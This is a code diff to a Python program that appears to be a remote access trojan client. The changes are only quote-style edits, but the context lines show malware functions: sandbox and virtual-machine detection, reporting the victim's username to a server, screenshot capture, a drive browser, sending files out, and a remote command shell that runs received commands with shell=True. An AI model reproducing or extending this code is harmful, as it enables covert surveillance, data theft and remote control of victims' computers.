@@ -102,7 +102,7 @@ def server_connect():
         strPlatform += " (Sandboxie) "
     if detectVM():
         strPlatform += " (Virtual Machine) "
-    arrUserInfo.extend([strPlatform, os.environ['USERNAME']])
+    arrUserInfo.extend([strPlatform, os.environ["USERNAME"]])
 
     send(json.dumps(arrUserInfo).encode())
 
@@ -164,7 +164,7 @@ def screenshot():
     # Create BytesIO Object as objBytes
     with BytesIO() as objBytes:
         # Save Screenshot into BytesIO Object
-        objImage.save(objBytes, format='PNG')
+        objImage.save(objBytes, format="PNG")
         # Get BytesIO Object Data as bytes
         objPic = objBytes.getvalue()
 
@@ -177,7 +177,7 @@ def screenshot():
 
 def file_browser():
     arrRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
-    arrRawDrives = arrRawDrives.split('\000')[:-1]
+    arrRawDrives = arrRawDrives.split("\000")[:-1]
 
     strDrives = ""
     for drive in arrRawDrives:  # get proper view and place array into string
@@ -224,7 +224,7 @@ def receive(data):
 
     send(f"{os.path.getsize(data)}".encode())
     time.sleep(1)
-    with open(data, 'rb') as objFile:
+    with open(data, "rb") as objFile:
         send(objFile.read()) # Send Contents of File
 
 
@@ -261,7 +261,7 @@ def command_shell():
         elif len(strData) > 0:
             objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
             strOutput = objCommand.stdout.read() + objCommand.stderr.read()  # since cmd uses bytes, decode it
-            bytData = strOutput + b'\n' + os.getcwdb() + b'>'
+            bytData = strOutput + b"\n" + os.getcwdb() + b">"
         else:
             bytData = b"Error!"
 
